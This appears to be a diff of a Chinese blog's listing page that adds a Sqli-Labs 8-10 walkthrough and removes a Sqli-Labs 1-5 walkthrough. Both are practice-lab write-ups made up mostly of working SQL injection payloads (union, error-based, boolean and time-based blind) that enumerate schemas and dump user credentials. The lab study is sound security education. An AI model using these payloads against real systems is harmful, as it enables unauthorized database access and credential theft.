@@ -277,6 +277,133 @@
 </nav>
       <div class="body-wrap">
   
+    <article id="post-mz" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a  href="/2021/02/26/mz/" class="article-date">
+      <time datetime="2021-02-26T05:52:18.000Z" itemprop="datePublished">2021-02-26</time>
+</a>
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a  class="article-title" href="/2021/02/26/mz/">Sqli-Labs靶场8-10</a>
+    </h1>
+  
+
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h1>知识点</h1>
+
+<p>函数</p>
+<ul>
+<li>length()函数                返回字段/结果/函数的长度，length(column_name)
+</li><li>length(database())            即返回当前数据库名长度
+</li><li>substr()函数             截取字符段长度
+</li><li>例如：substr（abcd，1，1） 从第一位开始（也就是从a开始）截取一个字符，就是a
+</li><li>  substr（abcd，2，1）     从第二位开始，截取一个字符，就是b
+</li><li>substr（abcd，2，3）       从第二位开始，截取三个字符，就是bcd
+</li><li>if()函数                条件判断函数
+</li><li>if(a,b,c)      if判断句，a为条件，b、c为执行语句；如果a为真就执行b，a为假就执行c;
+</li><li>sleep()函数            网页延迟n秒后，输出结果
+</li><li>left（）函数             从左边数，取几个数
+</li><li>例如：left（abcdef，3）  取3位左边的数，就是abc
+</li></ul>
+
+<p><img src="/2021/02/26/mz/b1.png"></p>
+<h1>Less-8（基于布尔的盲注）</h1>
+
+<p><b style="color:pink">基于布尔的盲注：</b><br>$sql=”SELECT * FROM users WHERE id=’$id’ LIMIT 0,1”;<br>$result=mysql_query($sql);<br>$row = mysql_fetch_array($result);<br>if($row){<br>      echo ‘You are in………..’;<br>}else{<br>}<br><b style="color:pink">payload:</b></p>
+<ol>
+<li>Less-8/?id=1' and (ascii(substr((select database()) ,1,1))) = 115--+
+</li><li>Less-8/?id=1' and (length(database())) = 8 --+ //数库名长度=8
+</li></ol>
+
+<p><b style="color:pink">盲注得到数据库名：security</b></p>
+<ol>
+<li>Less-8/?id=1' and (ascii(substr((select database()) ,1,1))) = 115 --+
+</li><li>Less-8/?id=1' and (ascii(substr((select database()) ,2,1))) = 101 --+
+</li><li>Less-8/?id=1' and (ascii(substr((select database()) ,3,1))) = 99 --+
+</li><li>Less-8/?id=1' and (ascii(substr((select database()) ,4,1))) = 117 --+
+</li><li>Less-8/?id=1' and (ascii(substr((select database()) ,5,1))) = 114 --+
+</li><li>Less-8/?id=1' and (ascii(substr((select database()) ,6,1))) = 105 --+
+</li><li>Less-8/?id=1' and (ascii(substr((select database()) ,7,1))) = 116 --+
+</li><li>Less-8/?id=1' and (ascii(substr((select database()) ,8,1))) = 121 --+  
+</li></ol>
+
+<p><b style="color:pink">接着判断表名长度：</b><br>Less-8/?id=1’ and (length((select table_name from information_schema.tables where table_schema=database() limit 0,1))) = 6 –+<br><b style="color:pink">接下来判断表名为user：</b><br>?id=1’ and (length((select table_name from information_schema.tables where table_schema=database() limit 3,1))) = 5 –+</p>
+<ol>
+<li>Less-8/?id=1' and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 3,1) ,1,1))) = 117 --+
+
+</li><li>Less-8/?id=1' and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 3,1) ,2,1))) = 115 --+
+
+</li><li>Less-8/?id=1' and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 3,1) ,3,1))) = 101 --+
+
+</li><li>Less-8/?id=1' and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 3,1) ,4,1))) = 114 --+
+
+</li><li>Less-8/?id=1' and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 3,1) ,5,1))) = 115 --+
+</li></ol>
+
+<p>其余的用同样的盲注方法得到结果</p>
+<h1>Less-9（基于时间盲注1）</h1>
+
+<p><b style="color:purple">一、判断注入点</b><br>?id=1’)and (sleep(4)) –+ （耗时2s，这是正常的页面，没有闭合的页面）<br>?id=1’and (sleep(4)) –+ （耗时6s，因为正常页面需要2s，所以闭合之后消耗的时间为又增加了4s，所以是6s）<br>时间注入判断注入点就用这个<br>由于不报错，所以判断注入点，就是用sleep延迟函数<br>根据第8关的思想我们先判断数据库的长度</p>
+<ul>
+<li>?id=1' and if (length(database()) = 8 ,sleep(4),1)--+
+</li></ul>
+
+<p>数据库的长度为8，就延时反应4秒<br>知道了数据库的长度，那么我们就进行爆库;<br>?id=1’ and If(ascii(substr(database(),1,1))=115,sleep(5),1)–+<br>说明第一位是 s （ascii 码是 115）<br>?id=1’ and If(ascii(substr(database(),2,1))=101,sleep(5),1)–+<br>说明第一位是 e （ascii 码是 101）<br><b style="color:purple">二、爆表名</b><br>?id=1’ and If(ascii(substr((select table_name from information_schema.tables where table_schema=’security’ limit 3,1),1,1))=117,sleep(4),1)–+ （u）<br>?id=1’ and If(ascii(substr((select table_name from information_schema.tables where table_schema=’security’ limit 3,1),2,1))=115,sleep(4),1)–+ （s）<br>以此类推<br>————————————————<br>?id=1’ and If(ascii(substr((select column_name from information_schema.columns where table_name=’users’ and table_schema=database() limit 0,1),1,1))=105,sleep(4),1)–+</p>
+<p>猜测 users 表的第一个列的第一个字符是 i，<br>以此类推，我们得到列名是 id，username，password<br><b style="color:purple">三、爆数据</b><br>?id=1’ and If(ascii(substr((select username from users limit 0,1),1,1))=68,sleep(4),1)–+<br>以此类推，我们得到数据库 username，password 的所有内容</p>
+<h1>Less-10（基于时间盲注2）</h1>
+
+<p>和第九关一样，基于时间盲注的注入<br>双引号注入：<br>系统的来判断一下注入点</p>
+<ul>
+<li>?id=1" and (sleep(3))--+  （有延迟）
+</li><li>?id=1’ and (sleep(3))--+   (无延迟)
+</li></ul>
+
+<p>接下来和第九关步骤一样，得到想要的内容</p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+
+
+  
     <article id="post-bc" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -1115,173 +1242,9 @@ highlight_file(__FILE__);
 
 
   
-    <article id="post-bachang" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a  href="/2021/02/01/bachang/" class="article-date">
-      <time datetime="2021-02-01T06:24:18.000Z" itemprop="datePublished">2021-02-01</time>
-</a>
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a  class="article-title" href="/2021/02/01/bachang/">Sqlilabs靶场1-5</a>
-    </h1>
-  
-
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <h1>知识点</h1>
-
-<p>查数据库名：select database()<br>information_schema.tables：存储mysql数据库下面的所有表名信息的表<br>table_schema：数据库名<br>table_name：表名<br>column_name：列名<br>information_schema.columns ：存储mysql数据库下面的所有列名信息的表<br>table_name：表名<br>–+：表示注释，目的是把字符数据的后一个单引号及后面的语句注释掉，以免影响<br>group_concat函数：它将相同行的指定列的数据连在一起，如果不用该函数，只能显示一个数据，满足不了我们的需求，所以用group_concat函数将所有数据显示</p>
-<h1>Less-1</h1>
-<h4>界面：</h4>
-
-<p><img src="/2021/02/01/bachang/oh0.png"></p>
-<h4>测试：</h4>
-
-<p><b style="color:red">1、</b> url + ?id=1<br><img src="/2021/02/01/bachang/oh1.png"><br>回显正常，说明不是数字型注入<br><b style="color:red">2、</b> url + ?id=1’<br><img src="/2021/02/01/bachang/oh2.png"><br>回显报错，说明是字符型注入<br><b style="color:red">3、</b> url + ?id=1’ or ‘1’=’1<br><img src="/2021/02/01/bachang/oh3.png"><br>回显正常，单引号闭合成功，通过单引号闭合进行注入<br><b style="color:red">4、</b>进行测试：</p>
-<ul>
-<li>url + ?id=1' order by 3--+ 
-<br>//回显正常
-</li><li>url + ?id=1' order by 4--+
-<br>//报错："Unknown column '4' in 'order clause'"
-</li></ul>
-
-<p><img src="/2021/02/01/bachang/oh4.png"><br>通过逐个测试，得出字段数为3，进行联合注入<br><b style="color:red">5、</b>查看回显的字段：<br>url + ?id=-1’ union select 1,2,3 –+<br>//得到可以回显的字段：2,3字段<br><img src="/2021/02/01/bachang/oh5.png"><br>url + ?id=-1’ union select 1,database(),3 –+<br>//得到字段2所对应的数据库名为security<br><img src="/2021/02/01/bachang/oh6.png"><br><b style="color:red">6、</b>查看所有数据库名：<br>url + ?id=-1’ union select 1,<br>(select group_concat(schema_name) from information_schema.schemata),3 –+<br><img src="/2021/02/01/bachang/oh7.png"><br><b style="color:red">7、</b>查看security库内的所有表名：<br>url + ?id=-1’ union select 1,<br>(select group_concat(table_name) from information_schema.tables where table_schema=’security’),3 –+<br><img src="/2021/02/01/bachang/oh8.png"><br><b style="color:red">8、</b>爆出users表中的列名：<br>url + ?id=-1’ union select 1,<br>(select group_concat(column_name) from information_schema.columns where table_name=’users’),3 –+<br><img src="/2021/02/01/bachang/oh9.png"><br>有用户名和密码<br><b style="color:red">9、</b>爆破用户名和密码：<br>url + ?id=-1’ union select 1,<br>(select group_concat(password) from security.users),(select group_concat(username) from security.users) –+<br><img src="/2021/02/01/bachang/oh10.png"><br>得到所有的用户名和密码</p>
-<h1>Less-2</h1>
-
-<h4>界面：</h4>
-
-<p><img src="/2021/02/01/bachang/eee1.png"><br>进行测试，结果如下：<br><img src="/2021/02/01/bachang/eee2.png"><br>发现属于数字型注入，不需要进行闭合，直接进行注入<br>同Less-1一样，通过构造?id=-1 order by 1/2/3/4来得出字段数为3<br>构造?id=1 and 1=2 union select 1,2,3 或者 ?id=-1 union select 1,2,3来判断回显字段：<br><img src="/2021/02/01/bachang/eee3.png"><br>回显字段和Less-1一样是2和3<br>//其他步骤同Less-1类似，只是id=-1后没有加’</p>
-<h4>最终payload：</h4>
-
-<p>?id=-1 union select 1,<br>(select group_concat(password) from security.users),(select group_concat(username) from security.users) –+<br><img src="/2021/02/01/bachang/eee4.png"><br>得到所有用户名和密码</p>
-<h1>Less-3</h1>
-<h4>界面</h4>
-
-<p><img src="/2021/02/01/bachang/a0.png"></p>
-<h4>测试：</h4>
-
-<p>单引号与括号闭合</p>
-<ul>
-<li>url + ?id=1
-//回显正常
-</li><li>url + ?id=1'
-//You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'') LIMIT 0,1' at line 1
-</li><li>url + ?id=1') --+
-//回显正常
-</li></ul>
-
-<p>构造?id=1’) order by 1/2/3/4–+ 获得字段数3<br><img src="/2021/02/01/bachang/a1.png"><br>构造：?id=-1) union select 1,2,3–+<br><img src="/2021/02/01/bachang/a2.png"><br>回显字段依然是2和3<br>其余步骤依然与Less-1类似，只需将id=1’改成id=-1’)</p>
-<h4>最终payload：</h4>
-
-<p>?id=-1’) union select 1,<br>(select group_concat(password) from security.users),(select group_concat(username) from security.users)–+<br><img src="/2021/02/01/bachang/a3.png"><br>得到所有用户名和密码！</p>
-<h1>Less-4</h1>
-<h4>界面</h4>
-
-<p><img src="/2021/02/01/bachang/b1.png"></p>
-<h4>测试：</h4>
-
-<p>先提交1，成功回显，在提交1’,回显成功，提交1’’,报错<br><img src="/2021/02/01/bachang/b2.png"><br>双引号和括号闭合</p>
-<ul>
-<li>url + ?id=1") --+
-//闭合成功
-</li><li>url + ?id=1") order by 1/2/3/4--+
-//得到字段数3
-</li><li>url + ?id=-1") union select 1,2,3--+</li>
-<img src="/2021/02/01/bachang/b3.png">
-<br>//进行联合注入,得到回显字段
-</ul>
-
-<p>其余步骤依然与Less-1类似，只需将id=1’改成id=-1”)</p>
-<h4>最终payload</h4>
-
-<p>url + ?id=-1’) union select 1,<br>(select group_concat(password) from security.users),(select group_concat(username) from security.users)–+<br><img src="/2021/02/01/bachang/b4.png"><br>得到所有用户名和密码~</p>
-<h1>Less-5</h1>
-<h4>界面：</h4>
-
-<p><img src="/2021/02/01/bachang/q1.png"></p>
-<h4>测试：</h4>
-
-<p><b style="color:blue">###1、</b>逐个测试</p>
-<ul>
-<li>?id=1
-//回显：You are in..........
-</li><li>?id=1'
-//回显：You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1
-</li></ul>
-
-<p>构造：?id=1’ order by 3–+ 来确认字段数量<br><b style="color:blue">###2、</b>获取数据库名<br>法一：通过updatexml报错注入：</p>
-<ul>
-<li>?id=1' and 1=(updatexml(1,concat(0x3a,(select database())),1))%23
-</li></ul>
-法二：通过floor报错注入：
-<ul>
-<li>?id=1' union select count(*),0,concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2))as a from information_schema.tables group by a limit 0,10 --+
-</li></ul>
-
-<p>可以知道数据库名为：security<br><img src="/2021/02/01/bachang/q2.png"><br><b style="color:blue">###3、</b>获取security数据库的表名</p>
-<ul>
-<li>?id=1' and updatexml('~',concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='security'),0x7e),'~')--+
-</li></ul>
-
-<p><img src="/2021/02/01/bachang/q3.png"><br><b style="color:blue">###4、</b>查询users表内的字段名</p>
-<ul>
-<li>?id=1' and extractvalue(1,concat(0x7e,substring((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),1,32)))--+
-</li></ul>
-
-<p><img src="/2021/02/01/bachang/q4.png"></p>
-<p><b style="color:blue">###5、</b>查询users表内的字段数据</p>
-<ul>
-<li>?id=1' and extractvalue(1,concat(0x7e,substring((select group_concat(username,0x3a,password) from users),1,32)))--+
-</li></ul>
-
-<p><img src="/2021/02/01/bachang/q5.png"><br>啊~好累的一天<br><img src="/2021/02/01/bachang/bbb.png"></p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-
-      
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-
-
-  
   
     <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/page/2/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/4/">Next &amp;raquo;</a>
+      <a class="extend prev" rel="prev" href="/page/2/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><span class="space">&hellip;</span><a class="page-number" href="/page/7/">7</a><a class="extend next" rel="next" href="/page/4/">Next &amp;raquo;</a>
     </nav>
   
 
